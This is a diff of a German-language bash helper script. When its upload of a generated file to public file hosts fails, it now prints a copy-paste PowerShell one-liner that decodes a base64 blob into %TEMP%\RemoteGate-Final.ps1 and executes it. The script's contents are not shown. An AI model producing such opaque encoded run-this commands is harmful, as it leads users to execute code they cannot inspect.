@@ -58,9 +58,19 @@ UPLOAD_URL=$(curl -s --connect-timeout 2 -m 5 -F "file=@$OUTPUT_PATH" https://0x
 if [[ -z "$UPLOAD_URL" ]]; then
   UPLOAD_URL=$(curl -s --connect-timeout 2 -m 5 -F "file=@$OUTPUT_PATH" https://file.io 2>&1 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('link',''))" 2>/dev/null || true)
 fi
+# Immer ein Befehl geben — Online-Link wenn möglich, sonst Offline-Befehl (funktioniert immer, auch ohne Internet)
 if [[ -z "$UPLOAD_URL" ]]; then
-  echo "Upload fehlgeschlagen — prüfe Internet, dann nochmal gen.command starten"
-  exit 1
+  echo "Kein Upload — nutze Offline-Befehl (funktioniert genauso, 1 Zeile):"
+  B64=$(base64 -w 0 "$OUTPUT_PATH" 2>/dev/null || base64 "$OUTPUT_PATH" | tr -d '\n')
+  echo ""
+  echo "══════════════════════════════════════"
+  echo "DEIN WINDOWS-BEFEHL — diese EINE Zeile kopieren:"
+  echo "══════════════════════════════════════"
+  echo ""
+  echo "powershell -Command \"\$b=[Convert]::FromBase64String('$B64'); [IO.File]::WriteAllBytes(\"\$env:TEMP\\RemoteGate-Final.ps1\",\$b); & \$env:TEMP\\RemoteGate-Final.ps1\""
+  echo ""
+  echo "══════════════════════════════════════"
+  exit 0
 fi
 echo ""
 echo "══════════════════════════════════════"
